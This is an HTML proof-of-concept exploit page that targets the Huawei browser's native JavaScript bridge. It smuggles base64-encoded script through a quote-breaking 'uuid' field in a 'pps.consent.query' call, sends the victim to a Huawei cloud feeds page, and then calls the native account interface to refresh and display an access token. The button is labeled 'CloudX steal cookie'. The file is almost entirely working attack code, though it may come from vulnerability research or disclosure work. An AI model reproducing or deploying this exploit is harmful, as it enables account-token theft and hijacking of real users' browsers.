<!DOCTYPE html>
<html lang="en">
<h1>cc</h1>
<head>
    <meta charset="UTF-8">
    <title>HW</title>
    <script type="text/javascript">
        function triggerPoc(url, code) {
            const currUrl = location.href;
            const payload = `
        if (!location.href.startsWith("${currUrl}") && !window.__cloudx_called) {
            window.__cloudx_called = true;
            ${code}
        }
    `;
            const base64 = btoa(payload);
            for (let i = 0; i < 4000; i++) {
                setTimeout(function () {
                    if (window._HwJSBridge && typeof window._HwJSBridge.invokeAsync === "function") {
                        var payload2 = '\'},\'*\');}}};' + `eval(atob("${base64}"));//`;
                        var data = {
                            'content': JSON.stringify(content),
                            'url': 'https://www.baidu.com',
                            'webid': 'deadbeef',
                            'top': false,
                            'uuid': payload2
                        };
                        window._HwJSBridge.invokeAsync('pps.consent.query', JSON.stringify(data), '123');
                    }else{
                        alert('no _HwJSBridge')
                    }
                }, i);
            }
            location.href = url;
        }

        code = '                setTimeout(() => {\n' +
            '                    window.hwbr = window.hwbr || {};\n' +
            '                    window.hwbr.callbackFromNative = function (a, b, c, d, e) {\n' +
            '                        if (a == \'callbackId\') {\n' +
            '                            alert(\'b:\' + b + \'\\nc:\' + c + \'\\nd:\' + d.toString())\n' +
            '                        }\n' +
            '                    };\n' +
            '                    window._hwbrNative.invoke(\'account\', \'refreshAT\', \'callbackId\', \'["123", "123"]\', 10);\n' +
            '                }, 500);'

        // triggerPoc('https://feeds-drcn.cloud.huawei.com.cn/landingpage/latest?docid=1051253f3e903d7ffbd11fc014b09f7240dc0f6&to_app=hwbrowser&dy_scenario=relate&tn=fdb43cc7d95113d61182a46e5027c537c4e9b1c2dbcc7503bab085653b6c181a&channel=HW_FACA_ZH&ctype=news&cpid=666&r=CN#/', code)
    </script>
    <button style="width:800px;height:200px;font-size:30px;"
            onclick="triggerPoc('https://feeds-drcn.cloud.huawei.com.cn/landingpage/latest?docid=1051253f3e903d7ffbd11fc014b09f7240dc0f6&to_app=hwbrowser&dy_scenario=relate&tn=fdb43cc7d95113d61182a46e5027c537c4e9b1c2dbcc7503bab085653b6c181a&channel=HW_FACA_ZH&ctype=news&cpid=666&r=CN#/', code)">
        CloudX steal cookie
    </button>
</head>
</html>
